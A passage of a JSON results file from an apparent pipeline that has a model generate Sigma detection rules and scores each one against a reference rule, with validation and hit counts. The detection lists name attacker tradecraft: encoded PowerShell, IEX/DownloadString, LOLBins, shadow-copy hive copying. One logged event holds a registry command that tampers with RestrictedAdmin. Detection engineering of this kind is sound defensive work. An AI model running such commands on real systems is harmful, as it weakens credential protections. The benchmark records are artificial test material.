+    "sample_sha256": "8145631984ad4793aa4414f02d09cc61ee137191d2622a89b9882926988c0ac2"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": []
+   },
+   "spec_dropped": [],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Potentially Suspicious Child Processes Spawned by PowerShell\nid: 8603137b-97a9-47e7-a9b8-1461d40dcc59\nstatus: experimental\ndescription: Detects child processes that are commonly abused when spawned from PowerShell, indicating possible script-based\n  execution.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.execution\n- attack.t1059.001\n- detection.threat-hunting\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_parent:\n    ParentImage|endswith: powershell.exe\n  selection_suspicious_child:\n    Image|endswith:\n    - wscript.exe\n    - cscript.exe\n    - rundll32.exe\n    - certutil.exe\n    - bitsadmin.exe\n    - regsvr32.exe\n    - mshta.exe\n  selection_suspicious_cmdline:\n    CommandLine|contains:\n    - -Enc\n    - -EncodedCommand\n    - IEX\n    - DownloadString\n    - http://\n    - https://\n  condition: selection_parent and (selection_suspicious_child or selection_suspicious_cmdline)\nfalsepositives:\n- Legitimate administrative scripts that spawn wscript/cscript for benign tasks\n- Software installers using PowerShell to launch helper processes\nlevel: high\n",
+     "sha256": "f739dd109038f05447201d82fcb0b1bca1b6ba0a48b2206bbfc29699684e31dc",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 10.11
+     },
+     "tokens": 1803,
+     "latency_s": 7.72,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 15.28
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Potentially Suspicious PowerShell Child Processes\nid: e4b6d2a7-d8a4-4f19-acbd-943c16d90647\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes spawned by PowerShell.\n    Use this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\nreferences:\n    - https://twitter.com/ankit_anubhav/status/1518835408502620162\nauthor: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2022-04-26\nmodified: 2024-07-16\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\bash.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    filter_optional_amazon:\n        ParentCommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n        CommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n    filter_main_certutil_verify_store:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains: '-verifystore '\n    filter_main_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains:\n            - 'qfe list'\n            - 'diskdrive '\n            - 'csproduct '\n            - 'computersystem '\n            - ' os '\n            - ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are to be expected from PowerShell scripts that might make use of additional binaries such as \"mshta\", \"bitsadmin\", etc. Apply additional filters for those scripts.\nlevel: medium\nregression_tests_path: regression_data/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "c73124a7-3e89-44a3-bdc1-25fe4df754b1",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_cmd_shadowcopy_access.yml",
+    "title": "Copy From VolumeShadowCopy Via Cmd.EXE",
+    "category": "process_creation",
+    "date": "2021-08-09",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_cmd_shadowcopy_access/c73124a7-3e89-44a3-bdc1-25fe4df754b1.evtx",
+    "sample_sha256": "918d0c5827964f30dcbd69a2b817d7b283f4fdefde590c8941df5443a2fb86b4"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": [
+     {
+      "id": "T1490",
+      "quote": "attack.t1490"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": "copy ",
+      "quote": "the builtin \\\"copy\\\" command"
+     },
+     "reason": "quote not found verbatim in report"
+    },
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\cmd.exe",
+      "quote": "Cmd.EXE"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 1,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "{\n \"title\": \"Copy From Volume Shadow Copy via cmd.exe\",\n \"description\": \"Detects usage of the built-in copy command targeting a volume shadow copy, often used to copy registry hives.\",\n \"tags\": [\n  \"attack.t1490\",\n  \"attack.impact\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [\n  {\n   \"name\": \"selection\",\n   \"fields\": [\n    {\n     \"field\": \"Image\",\n     \"modifier\": \"endswith\",\n     \"values\": [\n      \"\\\\cmd.exe\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"contains\",\n     \"values\": [\n      \"copy\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"contains\",\n     \"values\": [\n      \"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy\"\n     ]\n    }\n   ]\n  }\n ],\n \"condition\": \"selection\",\n \"falsepositives\": [],\n \"level\": \"high\"\n}",
+     "sha256": "4612f315e9e841982e043825881d307be1319dbb7747831bd17b796c959a2302",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: group 'selection': duplicate field/modifier 'CommandLine|contains'; put all its values in one entry"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 1938,
+     "latency_s": 9.88,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "title: Copy From Volume Shadow Copy via cmd.exe\nid: d605dee9-1152-4187-a4e1-29e91d1b35e2\nstatus: experimental\ndescription: Detects usage of the built-in copy command targeting a volume shadow copy, often used to copy registry hives.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1490\n- attack.impact\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\cmd.exe\n    CommandLine|contains:\n    - copy\n    - \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\n  condition: selection\nfalsepositives:\n- Unknown\nlevel: high\n",
+     "sha256": "10f93de6a4e82d0237fa36bed69c3713599829a3caecc9b8f9348c72371c10b9",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 14.76
+     },
+     "tokens": 813,
+     "latency_s": 2.23,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": null,
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 12.41
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Copy From VolumeShadowCopy Via Cmd.EXE\nid: c73124a7-3e89-44a3-bdc1-25fe4df754b1\nstatus: test\ndescription: Detects the execution of the builtin \"copy\" command that targets a shadow copy (sometimes used to copy registry hives that are in use)\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816?s=20\n    - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection\n    - https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/\nauthor: Max Altgelt (Nextron Systems), Tobias Michalski (Nextron Systems)\ndate: 2021-08-09\nmodified: 2023-03-07\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\\\n        # There is an additional \"\\\" to escape the special \"?\"\n        CommandLine|contains|all:\n            - 'copy '\n            - '\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy'\n    condition: selection\nfalsepositives:\n    - Backup scenarios using the commandline\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_cmd_shadowcopy_access/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "164eda96-11b2-430b-85ff-6a265c15bf32",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_wmic_recon_group.yml",
+    "title": "Local Groups Reconnaissance Via Wmic.EXE",
+    "category": "process_creation",
+    "date": "2021-12-12",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_wmic_recon_group/164eda96-11b2-430b-85ff-6a265c15bf32.evtx",
+    "sample_sha256": "f60106ef423e9564f571164b9da54d99b3478eb41e788baec854bf8d5a0e6479"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [
+     {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": "group",
+      "quote": "Detects the execution of \"wmic\" with the \"group\" flag."
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1069.001",
+      "quote": "ATT&CK tags: attack.discovery, attack.t1069.001"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\wmic.exe",
+      "quote": "Detects the execution of \"wmic\" with the \"group\" flag."
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Local Groups Reconnaissance Via WMIC.EXE\nid: 03c9f3f6-4f6e-4387-89f9-6cf9f70a89d7\nstatus: experimental\ndescription: Detects execution of wmic.exe with the group flag, indicating local groups reconnaissance.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.discovery\n- attack.t1069.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: \\wmic.exe\n  selection_cmd:\n    CommandLine|contains: group\n  condition: selection_img and selection_cmd\nfalsepositives:\n- Unknown\nlevel: medium\n",
+     "sha256": "4b722a6482dde6a0990ca538ffe779b7dd5823829181cfd1089681c995809f86",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 13.64
+     },
+     "tokens": 2600,
+     "latency_s": 8.05,
+     "evaluator_error": null,
+     "resamples": 1
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 13.12
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Local Groups Reconnaissance Via Wmic.EXE\nid: 164eda96-11b2-430b-85ff-6a265c15bf32\nstatus: test\ndescription: |\n    Detects the execution of \"wmic\" with the \"group\" flag.\n    Adversaries may attempt to find local system groups and permission settings.\n    The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\n    Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md\nauthor: frack113\ndate: 2021-12-12\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.t1069.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: ' group'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: low\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_wmic_recon_group/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "28ac00d6-22d9-4a3c-927f-bbd770104573",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_reg_lsa_disable_restricted_admin.yml",
+    "title": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
+    "category": "process_creation",
+    "date": "2023-01-13",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_reg_lsa_disable_restricted_admin/28ac00d6-22d9-4a3c-927f-bbd770104573.evtx",
+    "sample_sha256": "fe2f419f7884e3abe98aa265c767bf264552eaf520384e58a45d2bad6492d35e"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "registry_set",
+    "observables": [
+     {
+      "field": "Registry.value_name",
+      "match": "equals",
+      "value": "DisableRestrictedAdmin",
+      "quote": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode."
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1112",
+      "quote": "ATT&CK tags: attack.persistence, attack.defense-impairment, attack.t1112"
+     }
+    ]
+   },
+   "spec_dropped": [],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: DisableRestrictedAdmin Registry Value Tampering\nid: 0fc456ab-4b59-4e44-82b3-91ed3ed982fb\nstatus: experimental\ndescription: Detects changes to the DisableRestrictedAdmin registry value to enable or disable RestrictedAdmin mode.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.persistence\n- attack.defense-impairment\n- attack.t1112\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|endswith: \\DisableRestrictedAdmin\n    EventType: SetValue\n  condition: selection\nfalsepositives:\n- Legitimate administrative changes to RestrictedAdmin mode.\nlevel: medium\n",
+     "sha256": "62e4cb0e8e602fbd2c2b21d23dff49cf2e1b66cc4f2c9339ee70a6d361a7d9a6",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "28ac00d6-22d9-4a3c-927f-bbd770104573.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+        "UtcTime": "2026-08-07 11:26:20.730",
+        "ProcessGuid": "{570e49aa-c0dc-6a75-2704-000000001300}",
+        "ProcessId": "3244",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "FileVersion": "10.0.26100.8737 (WinBuild.160101.0800)",
+        "Description": "Windows Command Processor",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "Cmd.Exe",
+        "CommandLine": "\"cmd.exe\" /c reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-b8ea-6a75-1bda-070000000000}",
+        "LogonId": "0x000000000007da1b",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=6142A8457F497ABC4B102D75F549F76A9E3577C7,MD5=1F4D18374A699452622E80F6D5BB743E,SHA256=65EC268ADD3973B6DCA64222985DA47CAEAEE44A340B0EC1466782914FD743D9,IMPHASH=010B165E4C37F484601D3DBD700C9423",
+        "ParentProcessGuid": "{570e49aa-bd18-6a75-7201-000000001300}",
+        "ParentProcessId": "6428",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 12.84
+     },
+     "tokens": 1743,
+     "latency_s": 5.78,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "title: DisableRestrictedAdmin Registry Value Tampering\nid: 0fc456ab-4b59-4e44-82b3-91ed3ed982fb\nstatus: experimental\ndescription: Detects changes to the DisableRestrictedAdmin registry value to enable or disable RestrictedAdmin mode.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.persistence\n- attack.defense-impairment\n- attack.t1112\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|endswith: \\DisableRestrictedAdmin\n    EventType: SetValue\n  condition: selection\nfalsepositives:\n- Legitimate administrative changes to RestrictedAdmin mode.\nlevel: medium\n",
+     "sha256": "62e4cb0e8e602fbd2c2b21d23dff49cf2e1b66cc4f2c9339ee70a6d361a7d9a6",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "28ac00d6-22d9-4a3c-927f-bbd770104573.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+        "UtcTime": "2026-08-07 11:26:20.730",
+        "ProcessGuid": "{570e49aa-c0dc-6a75-2704-000000001300}",
+        "ProcessId": "3244",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "FileVersion": "10.0.26100.8737 (WinBuild.160101.0800)",
+        "Description": "Windows Command Processor",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "Cmd.Exe",
+        "CommandLine": "\"cmd.exe\" /c reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-b8ea-6a75-1bda-070000000000}",
+        "LogonId": "0x000000000007da1b",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=6142A8457F497ABC4B102D75F549F76A9E3577C7,MD5=1F4D18374A699452622E80F6D5BB743E,SHA256=65EC268ADD3973B6DCA64222985DA47CAEAEE44A340B0EC1466782914FD743D9,IMPHASH=010B165E4C37F484601D3DBD700C9423",
+        "ParentProcessGuid": "{570e49aa-bd18-6a75-7201-000000001300}",
+        "ParentProcessId": "6428",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 11.95
+     },
+     "tokens": 2840,
+     "latency_s": 9.8,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: DisableRestrictedAdmin Registry Value Tampering\nid: 0fc456ab-4b59-4e44-82b3-91ed3ed982fb\nstatus: experimental\ndescription: Detects changes to the DisableRestrictedAdmin registry value to enable or disable RestrictedAdmin mode.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.persistence\n- attack.defense-impairment\n- attack.t1112\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    TargetObject|endswith|endswith: \\DisableRestrictedAdmin\n    EventType: SetValue\n  selection_sysmon:\n    CommandLine|contains|contains: DisableRestrictedAdmin\n  condition: selection or selection_sysmon\nfalsepositives:\n- Legitimate administrative changes to RestrictedAdmin mode.\nlevel: medium\n",
+     "sha256": "0951e83a5efd3e9fd9b07218ba9fc62f0349ed0ca5bd2ad797449b4a7809fbc4",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "maRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-xrmtq2jy/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)) modifiers={<class 'sigma.modifiers.SigmaEndswithModifier'>}\nissue=ModifierAppliedMultipleIssue severity=medium description=Modifiers shouldn't be applied multiple times rule=<tmp>\\proc_creation_win_shakedown_candidate.yml detection_item=SigmaDetectionItem(parent=SigmaDetection(parent=ConditionIdentifier(parent=ConditionOR(parent=None, args=[ConditionAND(parent=ConditionIdentifier(parent=..., args=['selection'], source=None, identifier='selection'), args=[ConditionFieldEqualsValueExpression(parent=..., field='TargetObject', value=SigmaString([<SpecialChars.WILDCARD_MULTI: 1>, '\\\\DisableRestrictedAdmin'])), ConditionFieldEqualsValueExpression(parent=..., field='EventType', value=SigmaString(['SetValue']))], source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-xrmtq2jy/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)), ConditionFieldEqualsValueExpression(parent=..., field='CommandLine', value=SigmaString([<SpecialChars.WILDCARD_MULTI: 1>, 'DisableRestrictedAdmin', <SpecialChars.WILDCARD_MULTI: 1>]))], source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-xrmtq2jy/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)), args=['selection_sysmon'], source=None, identifier='selection_sysmon'), detection_items=[...], source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-xrmtq2jy/proc_creation_win_shakedown_candidate.yml'), line=None, char=None), item_linking=<class 'sigma.conditions.ConditionAND'>), applied_processing_items=set(), field='CommandLine', modifiers=[<class 'sigma.modifiers.SigmaContainsModifier'>, <class 'sigma.modifiers.SigmaContainsModifier'>], value=[SigmaString([<SpecialChars.WILDCARD_MULTI: 1>, 'DisableRestrictedAdmin', <SpecialChars.WILDCARD_MULTI: 1>])], value_linking=<class 'sigma.conditions.ConditionOR'>, negated=False, source=SigmaRuleLocation(path=WindowsPath('C:/Users/prajw/AppData/Local/Temp/shakedown-validate-xrmtq2jy/proc_creation_win_shakedown_candidate.yml'), line=None, char=None)) modifiers={<class 'sigma.modifiers.SigmaContainsModifier'>}\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 2 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+------------------------------+----------+-----------------------------------------------+\n| Count | Issue                        | Severity | Description                                   |\n+-------+------------------------------+----------+-----------------------------------------------+\n| 2     | ModifierAppliedMultipleIssue | MEDIUM   | Modifiers shouldn't be applied multiple times |\n+-------+------------------------------+----------+-----------------------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "28ac00d6-22d9-4a3c-927f-bbd770104573.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+        "UtcTime": "2026-08-07 11:26:20.730",
+        "ProcessGuid": "{570e49aa-c0dc-6a75-2704-000000001300}",
+        "ProcessId": "3244",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "FileVersion": "10.0.26100.8737 (WinBuild.160101.0800)",
+        "Description": "Windows Command Processor",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "Cmd.Exe",
+        "CommandLine": "\"cmd.exe\" /c reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-b8ea-6a75-1bda-070000000000}",
+        "LogonId": "0x000000000007da1b",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=6142A8457F497ABC4B102D75F549F76A9E3577C7,MD5=1F4D18374A699452622E80F6D5BB743E,SHA256=65EC268ADD3973B6DCA64222985DA47CAEAEE44A340B0EC1466782914FD743D9,IMPHASH=010B165E4C37F484601D3DBD700C9423",
+        "ParentProcessGuid": "{570e49aa-bd18-6a75-7201-000000001300}",
+        "ParentProcessId": "6428",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 8.94
+     },
+     "tokens": 6174,
+     "latency_s": 19.36,
+     "evaluator_error": null,
+     "resamples": 1
+    },
+    {
+     "index": 3,
+     "action": "repair",
